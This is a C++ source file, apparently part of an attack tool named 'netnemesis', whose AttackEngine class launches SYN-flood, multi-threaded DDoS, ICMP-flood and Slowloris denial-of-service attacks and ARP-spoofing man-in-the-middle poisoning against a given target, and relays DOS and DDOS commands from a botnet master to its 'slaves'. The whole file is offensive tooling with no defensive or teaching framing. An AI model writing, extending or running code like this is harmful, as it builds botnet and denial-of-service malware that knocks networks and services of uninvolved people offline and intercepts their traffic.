#include "netnemesis.h"

AttackEngine::AttackEngine(BotnetManager *bm) : botnet(bm) {}

void AttackEngine::executeDOS(const std::string &target, int port, bool use_raw) {
    Utils::animateAttack("DOS", target + ":" + std::to_string(port));
    if (use_raw) {
        packet_crafter.sendSYNFlood(target, port, 1000);
    }
    if (botnet && botnet->isMaster()) {
        botnet->broadcastToSlaves("DOS " + target + " " + std::to_string(port));
    }
}

void AttackEngine::executeDDOS(const std::string &target, int port, int bots) {
    Utils::animateAttack("DDOS", target + ":" + std::to_string(port));
    std::vector<std::thread> threads;
    for (int i = 0; i < bots; i++) {
        threads.emplace_back([this, target, port]() {
            packet_crafter.sendSYNFlood(target, port, 100);
        });
    }
    for (auto &t : threads) t.join();
    
    if (botnet && botnet->isMaster()) {
        botnet->broadcastToSlaves("DDOS " + target + " " + std::to_string(port));
    }
}

void AttackEngine::executeICMPFlood(const std::string &target, int packets) {
    Utils::animateAttack("ICMP FLOOD", target);
    icmp_flooder.flood(target, packets, 1000);
}

void AttackEngine::executeSlowloris(const std::string &target, int port, int connections) {
    Utils::animateAttack("SLOWLORIS", target + ":" + std::to_string(port));
    slowloris.attack(target, port, connections);
}

void AttackEngine::stopSlowloris() {
    slowloris.stop();
    Utils::logInfo("Slowloris stopped");
}

void AttackEngine::executeARPSpoof(const std::string &target, const std::string &gateway) {
    Utils::animateAttack("ARP SPOOFING", target + " <-> " + gateway);
    arp_spoofer.initialize("eth0"); // or detect automatically
    arp_spoofer.startPoisoning(target, gateway);
}

void AttackEngine::executeHunt() {
    Utils::logWarning("HUNT mode active");
}